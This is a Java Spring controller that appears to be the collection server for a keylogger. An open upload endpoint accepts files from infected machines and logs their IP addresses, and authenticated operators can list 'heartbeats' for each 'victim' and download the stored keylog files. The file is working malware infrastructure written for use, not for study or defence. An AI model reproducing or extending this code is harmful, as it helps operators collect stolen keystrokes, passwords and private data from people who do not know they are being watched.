package org.example.Controllers;

import jakarta.servlet.http.HttpServletRequest;
import lombok.RequiredArgsConstructor;
import org.example.Entities.Heartbeat;
import org.example.Repositories.HeartbeatsRepository;
import org.example.Repositories.VictimsRepository;
import org.example.Services.HeartbeatsService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.security.access.prepost.PreAuthorize;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;
import org.springframework.web.server.ResponseStatusException;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;

@RestController
@RequestMapping("/api/v1/heartbeat")
@RequiredArgsConstructor
public class HeartbeatsController {

    private final HeartbeatsService heartbeatService;

    @PostMapping("/upload")
    public ResponseEntity<Heartbeat> uploadHeartbeat(HttpServletRequest request,
                                                     @RequestParam("file") MultipartFile file) throws IOException {
        String ip = request.getRemoteAddr();
        Heartbeat saved = heartbeatService.saveHeartbeat(ip, file);
        return ResponseEntity.ok(saved);
    }

    @GetMapping("/{victimId}")
    @PreAuthorize("hasRole('USER')")
    public List<Heartbeat> getHeartbeatsByVictim(@PathVariable Long victimId) {
        return heartbeatService.getByVictimId(victimId);
    }

    @GetMapping("/{victimId}/{heartbeatId}")
    @PreAuthorize("hasRole('USER')")
    public Heartbeat getHeartbeat(@PathVariable Long victimId,
                                  @PathVariable Long heartbeatId) {
        Heartbeat heartbeat = heartbeatService.getById(heartbeatId);
        if (!heartbeat.getVictim().getId().equals(victimId)) {
            throw new ResponseStatusException(HttpStatus.FORBIDDEN, "Not allowed");
        }
        return heartbeat;
    }

    @GetMapping("/file/{heartbeatId}")
    @PreAuthorize("hasRole('USER')")
    public ResponseEntity<byte[]> downloadKeylogFile(@PathVariable Long heartbeatId) throws IOException {
        Heartbeat heartbeat = heartbeatService.getById(heartbeatId);
        Path filePath = Path.of(heartbeat.getKeyLogFilePath());

        if (!Files.exists(filePath)) {
            throw new ResponseStatusException(HttpStatus.NOT_FOUND, "File not found");
        }

        byte[] fileContent = Files.readAllBytes(filePath);
        String fileName = filePath.getFileName().toString();

        return ResponseEntity.ok()
                .header("Content-Disposition", "attachment; filename=\"" + fileName + "\"")
                .header("Content-Type", "text/plain")
                .body(fileContent);
    }


}

